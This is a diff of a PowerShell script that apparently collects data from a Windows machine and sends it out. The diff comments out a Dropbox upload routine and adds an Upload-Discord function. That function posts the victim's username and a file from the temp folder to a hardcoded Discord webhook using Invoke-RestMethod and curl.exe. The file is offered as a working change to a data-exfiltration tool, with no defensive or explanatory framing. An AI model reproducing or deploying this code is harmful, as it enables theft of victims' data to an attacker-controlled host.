@@ -33,7 +33,7 @@
 
 ############################################################################################################################################################
 
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
+#$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
 
 ############################################################################################################################################################
 
@@ -367,16 +367,40 @@ vault -ErrorAction SilentlyContinue -Force
 ############################################################################################################################################################
 
 # Upload output file to dropbox
+#$TargetFilePath="/$FileName"
+#$SourceFilePath="$env:TMP\$FileName"
+#$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+#$authorization = "Bearer " + $DropBoxAccessToken
+#$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+#$headers.Add("Authorization", $authorization)
+#$headers.Add("Dropbox-API-Arg", $arg)
+#$headers.Add("Content-Type", 'application/octet-stream')
+#Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 
-$TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = 'https://discordapp.com/api/webhooks/1057776370874318951/SxdxxTJg0oMKwnSgH3Z2RPOYhFVAB3EmHEUhTevPEB9gDuWnMEl7uJcNYZqKvYS8BX7t'
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "$env:TMP\$FileName" $hookurl}
+}
+
 
 ############################################################################################################################################################
 
